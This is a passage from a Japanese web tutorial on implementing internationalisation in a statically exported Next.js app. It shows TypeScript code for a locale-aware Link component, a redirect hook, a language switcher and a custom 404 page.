<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>次に、_app.tsxファイルにLanguageWrapperを追加します。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F29bc07vta3ak6cnooiig.png"></p>
<p>あともう一息です。<code class="language-text">src/components/_shared</code>ディレクトリに<code class="language-text">Link.tsx</code>という名前のコンポーネントを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> ReactNode <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> NextLink <span class="token keyword">from</span> <span class="token string">"next/link"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LinkProps</span> <span class="token punctuation">{</span>
  children<span class="token operator">:</span> ReactNode<span class="token punctuation">;</span>
  skipLocaleHandling<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">;</span>
  locale<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  href<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  target<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">Link</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span>
  children<span class="token punctuation">,</span>
  skipLocaleHandling<span class="token punctuation">,</span>
  target<span class="token punctuation">,</span>
  <span class="token operator">...</span>rest
<span class="token punctuation">}</span><span class="token operator">:</span> LinkProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> locale <span class="token operator">=</span> rest<span class="token punctuation">.</span>locale <span class="token operator">||</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> skipLocaleHandling <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>locale <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skipLocaleHandling<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    href <span class="token operator">=</span> href
      <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>locale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>href<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
      <span class="token operator">:</span> router<span class="token punctuation">.</span>pathname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[locale]"</span><span class="token punctuation">,</span> locale<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">NextLink</span></span> <span class="token attr-name">href</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>href<span class="token punctuation">}</span></span> <span class="token attr-name">target</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span>children<span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">NextLink</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>このプロジェクトでは、next/linkコンポーネントの代わりにこの<code class="language-text">Link</code>コンポーネントを使用します。</p>
<p>次に、<code class="language-text">hooks</code>フォルダの中に<code class="language-text">useRouteRedirect.ts</code>という名前のファイルを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useRouteRedirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">redirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span>to<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> replace<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token operator">?</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span>
      <span class="token operator">:</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>to<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// prevent endless loop</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> router<span class="token punctuation">.</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>replace<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span> redirect <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>以下に示すとおり、<code class="language-text">router.push</code>と<code class="language-text">router.replace</code>の代わりにこのカスタムフックを使用します。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fence2oltrv1xrk67ig8v.png"></p>
<p>次に、<code class="language-text">src/components</code>ディレクトリの中に<code class="language-text">LanguageSwitcher.tsx</code>コンポーネントを作成し、次のコードで特定の言語に切り替えられるようにします。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> Link <span class="token keyword">from</span> <span class="token string">"next/link"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LanguageSwitcherProps</span> <span class="token punctuation">{</span>
  locale<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  href<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  asPath<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">LanguageSwitcher</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span>
  locale<span class="token punctuation">,</span>
  <span class="token operator">...</span>rest
<span class="token punctuation">}</span><span class="token operator">:</span> LanguageSwitcherProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token keyword">let</span> pName <span class="token operator">=</span> router<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
  Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">===</span> <span class="token string">"locale"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      pName <span class="token operator">=</span> pName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> locale<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    pName <span class="token operator">=</span> pName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>locale<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>locale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>rest<span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span> <span class="token operator">:</span> pName<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span>
      <span class="token attr-name">href</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>href<span class="token punctuation">}</span></span>
      <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span>
        languageDetector<span class="token punctuation">.</span>cache <span class="token operator">?</span> languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>locale<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
      <span class="token punctuation">}</span></span>
    <span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">"small"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token punctuation">{</span>locale<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>お疲れ様です！<code class="language-text">output: export</code>を使用してNext.jsのプロジェクトにi18nを無事実装できました。動的に名前空間を切り替える場合など、異なる名前空間から翻訳を読み込みたい場合は、<code class="language-text">I18nProvider</code>コンポーネントの中の<code class="language-text">_app.tsx</code>で各名前空間とそれぞれに対応する翻訳ファイルを定義する必要があるということを覚えておいてください。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fw68zgdlq0mmqsfdawaax.png"></p>
<p>ビルドを作成してからテストを行う前に、<code class="language-text">pages</code>ディレクトリに<code class="language-text">404.tsx</code>ファイルを作成し、次のコードを挿入してください。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">FC</span><span class="token punctuation">,</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NextRouter<span class="token punctuation">,</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> getRouteRegex <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/route-regex"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> getClientBuildManifest <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/client/route-loader"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> parseRelativeUrl <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/parse-relative-url"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> isDynamicRoute <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/is-dynamic"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> removeTrailingSlash <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/remove-trailing-slash"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Link <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/components/_shared/Link"</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"production"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> sortedPages <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getClientBuildManifest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> sortedPages<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window <span class="token operator">!==</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token operator">?.</span>sortedPages<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token punctuation">.</span>sortedPages<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token punctuation">.</span>sortedPages<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getDoesLocationMatchPage</span><span class="token punctuation">(</span>location<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> pages <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> parsed <span class="token operator">=</span> <span class="token function">parseRelativeUrl</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> <span class="token punctuation">{</span> pathname <span class="token punctuation">}</span> <span class="token operator">=</span> parsed<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">pathMatchesPage</span><span class="token punctuation">(</span>pathname<span class="token punctuation">,</span> pages<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">pathMatchesPage</span><span class="token punctuation">(</span>pathname<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> pages<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> cleanPathname <span class="token operator">=</span> <span class="token function">removeTrailingSlash</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>pages<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>cleanPathname<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">const</span> page <span class="token operator">=</span> pages<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">isDynamicRoute</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getRouteRegex</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">.</span>re<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>cleanPathname<span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * If both asPath and pathname are equal then it means that we
 * are on the correct route it still doesnt exist
 */</span>
<span class="token keyword">function</span> <span class="token function">doesNeedsProcessing</span><span class="token punctuation">(</span>router<span class="token operator">:</span> NextRouter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> status <span class="token operator">=</span> router<span class="token punctuation">.</span>pathname <span class="token operator">!==</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Does Needs Processing"</span><span class="token punctuation">,</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">,</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">Custom404</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token punctuation">[</span>isNotFound<span class="token punctuation">,</span> setIsNotFound<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">processLocationAndRedirect</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>router<span class="token operator">:</span> NextRouter<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">doesNeedsProcessing</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> targetIsValidPage <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getDoesLocationMatchPage</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>targetIsValidPage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">setIsNotFound</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>isReady<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">processLocationAndRedirect</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// eslint-disable-next-line react-hooks/exhaustive-deps</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>router<span class="token punctuation">.</span>isReady<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isNotFound<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fixed inset-0 flex justify-center items-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex flex-col gap-10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Custom 404 - Page Not Found</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
